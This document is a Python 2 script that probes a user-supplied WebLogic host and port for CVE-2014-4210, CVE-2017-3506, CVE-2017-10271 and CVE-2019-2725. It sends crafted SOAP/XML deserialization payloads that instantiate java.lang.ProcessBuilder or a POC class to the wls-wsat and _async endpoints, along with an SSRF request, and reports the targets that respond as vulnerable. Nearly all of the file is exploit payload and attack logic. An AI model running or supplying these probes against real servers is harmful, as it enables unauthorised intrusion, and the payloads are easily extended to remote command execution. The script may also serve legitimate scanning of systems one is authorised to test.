#-*- coding:utf-8 -*-
import requests,sys
from colorama import Fore,Back,Style,init
import time
init(autoreset=True) 

#<faultstring>0  java.lang.ProcessBuilder
VUL=['CVE-2014-4210','CVE-2017-3506','CVE-2017-10271','CVE-2019-2725']

PATH = ['/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search',
'/wls-wsat/RegistrationRequesterPortType11',
'/wls-wsat/RegistrationRequesterPortType11', 
'/_async/AsyncResponseService'  
]

PAYLOAD=['',
'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="0" ></array><void method="start"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>',
'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><void class="POC"><array class="xx" length="0"></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>',
'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="POC"><array class="xx" length="0"></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>']

VER_SIG=['weblogic.uddi.client.structures.exception.XML_SoapException',['java.lang.ProcessBuilder','<faultstring>0'],['java.lang.ProcessBuilder','<faultstring>0'],202]

def run(dip,dport,index):
	header={'content-type':'text/xml','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0'}
	url = 'http://'+dip+':'+dport+PATH[index]
	print '[*] Start Check %s' %VUL[index]
	try:
		rep=requests.post(url,headers=header,data=PAYLOAD[index],timeout=5)
		if rep.status_code==200 and VER_SIG[index] in rep.text:
			print "[*] "+Fore.YELLOW+"The response find [" + VER_SIG[index] +"]"
			print "["+Fore.RED+"+"+Style.RESET_ALL+"] "+Fore.RED+'%s:%s is vul %s' %(dip,dport,VUL[index])
		elif rep.status_code==500:
			if VER_SIG[index][0] in rep.text:
				print "[*] "+Fore.YELLOW+"The response find  ["+VER_SIG[index][0]+"]"
				print "["+Fore.RED+"+"+Style.RESET_ALL+"] "+Fore.RED+'%s:%s is vul %s' %(dip,dport,VUL[index])
			elif VER_SIG[index][1] in rep.text:
				print "[*] "+Fore.YELLOW+"The response find ["+VER_SIG[index][1]+"]"
				print "["+Fore.RED+"+"+Style.RESET_ALL+"] "+Fore.RED+'%s:%s is vul %s' %(dip,dport,VUL[index])
		elif rep.status_code==VER_SIG[index]:
			print "[*] "+Fore.YELLOW+"The response code is %s " %VER_SIG[index]
			print "["+Fore.RED+"+"+Style.RESET_ALL+"] "+Fore.RED+'%s:%s is vul %s' %(dip,dport,VUL[index])
		else:
			print '[-] %s:%s is not vul %s' % (dip,dport,VUL[index])
	except Exception as e:
			print e
			pass
	except KeyboardInterrupt,e:
		sys.exit()
	finally:
		print
		pass

if __name__=="__main__":
	tt = time.time()
	dip = sys.argv[1]
	dport = sys.argv[2]

	print "[*] Weblogic vuln check: " + Fore.YELLOW+ "%s:%s" %(dip,dport)
	print "[*] Check [CVE-2014-4210(SSRF),CVE-2017-3506,CVE-2017-10271,CVE-2019-2725]"
	print
	for i in range(0,len(VUL)):
		run(dip,dport,i)
		time.sleep(2)
	print "[*] " + Fore.YELLOW + "Complete. Time used: {} sec".format(time.time() - tt)


